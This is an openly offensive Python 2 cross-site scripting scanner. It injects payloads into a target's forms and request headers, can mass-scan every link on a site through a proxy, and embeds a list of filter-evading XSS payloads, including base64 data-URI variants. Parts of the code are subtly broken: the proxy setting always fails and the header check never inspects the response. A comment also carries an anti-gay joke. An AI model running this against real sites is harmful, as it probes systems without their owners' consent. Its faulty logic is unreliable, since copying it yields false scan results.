#!/usr/bin/env python
import re
import urllib2
import urllib
import argparse
import datetime
import time
from urlparse import urlparse
from sys import exit
from os import system
"""
	Coded by R4z
"""


class Xss(object):
    headers = {
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1',
        'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
        'Referer': '',
        'Accept-Encoding': '',
        'Accept-Language': 'en-US,en;q=0.8',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
    }
    injection = None  # The injection string
    logfile = None  # The logfile
    writeintofile = ""
    # It's pretty obvious that this variable is used for proxy request
    proxy = None
    x = False
    total = 0
    vulnerabilities = []  # The vulnerabilities collected
    url = None  # The url

    def __init__(self, url=None, injection=None):
        """ The url must end with '/' """
        if url[-1:] != '/':
            url += '/'
        self.url = url
        self.injection = injection

    def set_url(self, url):
        """ Set the url """
        if url[-1:] != '/':
            url += '/'
        self.url = url

    def set_injection(self, injection):
        """ Set the injection string """
        self.injection = injection

    def set_logfile(self, file):
        self.logfile = file

    def set_proxy(self, proxy):
        if proxy is not None:
            try:
                proxy_handler = urllib2.ProxyHandler({'http': proxy})
                opener = urllib2.build_opener(proxy_handler)
                opener.addheaders = [('User-agent', 'Mozilla/5.0')]
                urllib2.install_opener(opener)
                req = urllib2.Request("http://www.google.com")
                sock = urllib2.urlopen(req, timeout=7)
                rs = sock.read(1000)
                if '<title>Google</title>' in rs:
                    this.proxy = proxy
                else:
                    exit("Proxy isn't valid")
            except:
                exit("Proxy isn't valid")

    def full_date(self):
        return datetime.datetime.now()

    def lets_have_fun(self):
        """ Start the scan """
        start_time = time.time()
        print self.full_date(), self.url
        self.writeintofile += "------------------------------------------------------\r\n[+] Scanning url %s\r\n------------------------------------------------------\r\n" % self.url
        print "Scanning headers.."
        self.inject_headers(None)
        print "Scanning forms.."
        self.get_forms()
        print "Results: "
        self.writeintofile += "---------------------------\r\nVulnerabilities: \r\n"
        for vuln in self.vulnerabilities:
            self.writeintofile += "URL: %s\r\nPayload: %s\r\nMethod: %s\r\n\r\n" % (
                vuln[0], vuln[1], vuln[2])
            print "URL: %s\r\nMethod: %s\r\n\r\n" % (vuln[0], vuln[1])
        self.writeintofile += "------------------------------------------------------\r\n------------------------------------------------------\r\n[+]Scanned in %s seconds\r\nTotal found: %d/%d\r\n------------------------------------------------------\r\n" % (
            (time.time() - start_time), len(self.vulnerabilities), self.total)
        if self.logfile is not None:
            f = open(self.logfile, "w+")
            f.write(self.writeintofile)
            f.close()

    def inject_headers(self, headers_to_inject):
        """ Checking for vulnerabilities in headers the headers_to_inject variable is in charge for which headers to check """
        headers = self.headers
        if headers_to_inject is None:
            headers_to_inject = ["Referer", "User-Agent"]
        for header in headers_to_inject:
            temp_value = header
            headers[header] += self.injection
            data = self.http_request(self.url, headers)
            if self.injection in headers:
                self.vulnerabilities.append([self.url, header + " header"])
                self.writeintofile += "[%s] %s injection success\r\n" % (
                    self.full_date(), "%s=%s" % (header, self.injection), header)
            else:
                self.writeintofile += "[%s] %s injection failed\r\n" % (
                    self.full_date(), header)
            self.total += 1
            headers[header] = temp_value

    def get_forms(self):
        """ Extracting the forms from the website """
        data = self.http_request(self.url)
        forms = re.findall(
            """<form.*?action=['|"](.*?)['|"].*?method=['|"](.*?)['|"].*?>(.*?)</form>""", data, re.DOTALL)  # Parse forms
        for form in forms:  # Scan each form
            self.scan(form)

    def scan(self, form):
        """ Gather all the data required and send it to the website """
        inputs = re.findall("""<input.*?name=['|"](.*?)['|"].*?>""", form[
                            2])  # Extract all the required parameters from the webpage
        data = ""
        for input in inputs:
            data += input + "=" + urllib.quote_plus(self.injection) + "&"
        data = data[:-1]
        self.send_payload(self.url, data, form)  # Send the payload
        self.total += 1

    def send_payload(self, url, data, form):
        """ Send the payload to the website """
        temp_url = url
        if form[0][0] == "/":
            temp_url = re.findall(
                "^(http.*?\/\/.*?)/.*$", temp_url)[0] + form[0]
        elif re.search("^http.*?\/\/.*?$", form[0]) is not None:
            temp_url = form[0]
        else:
            temp_url += form[0]
        if form[1] == 'post':
            html = self.http_post(temp_url, data)
        else:
            data = "?" + data
            temp_url += data
            html = self.http_request(temp_url)
        if self.injection in html:
            self.vulnerabilities.append(
                [urllib.unquote(temp_url).replace("+", " "), data, form[1].upper()])
            self.writeintofile += "[%s] The payload %s injection in %s method success\r\n" % (
                self.full_date(), self.injection, form[1].upper())
            return True
        else:
            self.writeintofile += "[%s] The payload %s injection in %s method failed\r\n" % (
                self.full_date(), self.injection, form[1].upper())
        return False

    def http_post(self, url, payload):
        """ This function is used for http post request """
        if self.proxy is not None:
            proxy = urllib2.ProxyHandler({'http': self.proxy})
            opener = urllib2.build_opener(proxy)
            urllib2.install_opener(opener)
        req = urllib2.Request(url, payload, self.headers)
        response = urllib2.urlopen(req)
        data = response.read()
        response.close()
        return data

    def http_request(self, url, hdrs=None):
        if hdrs is None:
            hdrs = self.headers
        """ This function is used for http get request """
        if self.proxy is not None:
            proxy = urllib2.ProxyHandler({'http': self.proxy})
            opener = urllib2.build_opener(proxy)
            urllib2.install_opener(opener)
        req = urllib2.Request(url, headers=hdrs)
        request = urllib2.urlopen(req)
        data = request.read()
        request.close()
        return data


def main():
    url = ""
    injections = [
        """<IMG SRC=" &#14;  javascript:alert('XSS');">""",
        """</title>"><iframe onerror="alert(/r4z/);" src=x></iframe>""",
        """<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgvcjR6Lyk8L3NjcmlwdD4=">""",
        """<img src=x onerror=alert(/r4z/)>""",
        """<scri%00pt>alert(1);</scri%00pt>""",
        """<svg/onload=prompt(1);>""",
        """<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">""",
    ]
    parser = argparse.ArgumentParser(description='XSS Scanner by R4z')
    parser.add_argument('-t', '--target', help='The target url', required=True)
    parser.add_argument(
        '-l', '--logfile', help='Optional log file', required=False)
    parser.add_argument(
        '-p', '--proxy', help='Optional proxy service', required=False)
    parser.add_argument(
        '-m', '--mass', help='Optional mass scan', required=False)
    args = parser.parse_args()
    if args.mass is not None:  # Mass scan
        def clean_netloc(domain):
            if re.search("^www[.].*$", domain) is not None:
                return domain[4:]
            return domain
        data = Xss(args.target).http_request(args.target)
        dhead = urlparse(args.target)  # Every good code needs some dirty stuff
        links = re.findall("""<a.*?href=['|"](.*?)['|"].*?>""", data)
        new_links = []
        data = ""
        for link in links:
            d = urlparse(link)
            # print d
            if ((clean_netloc(d.netloc) is clean_netloc(dhead.netloc)) is False and bool(d.netloc) is False) and len(link) is not 1:
                new_links.append(dhead.scheme + "://" + dhead.netloc + link)
        for target in new_links:
            the_thing = Xss(target, injections[1])
            the_thing.set_proxy(args.proxy)
            the_thing.lets_have_fun()
            data += the_thing.writeintofile
        f = open(dhead.netloc + ".log", "w+")
        f.write(data)
        f.close()

    else:
        the_thing = Xss(args.target, injections[1])
        the_thing.set_logfile(args.logfile)
        the_thing.set_proxy(args.proxy)
        the_thing.lets_have_fun()
if __name__ == "__main__":
    print """                                    /
                         __       //
                         -\= \=\ //
   XSS Scanner by R4z  --=_\=---//=--        
                     -_==/  \/ //\/--   
                      ==/   /O   O\==-- 
         _ _ _ _     /_/    \  ]  /--    
        /\ ( (- \    /       ] ] ]==-  
       (\ _\_\_\-\__/     \  (,_,)-- 
      (\_/                 \     \-   
      \/      /       (   ( \  ] /) 
      /      (         \   \_ \./ )  
      (       \         \      )  \     
      (       /\_ _ _ _ /---/ /\_  \    
       \     / \     / ____/ /   \  \  
        (   /   )   / /  /__ )   (  ) 
        (  )   / __/ '---`       / /
        \  /   \ \             _/ /  
        ] ]     )_\_         /__\/       
        /_\     ]___\                     
       (___)  """
    system("color d\r\ncls")  # Don't worry, i'm not gay
    main()
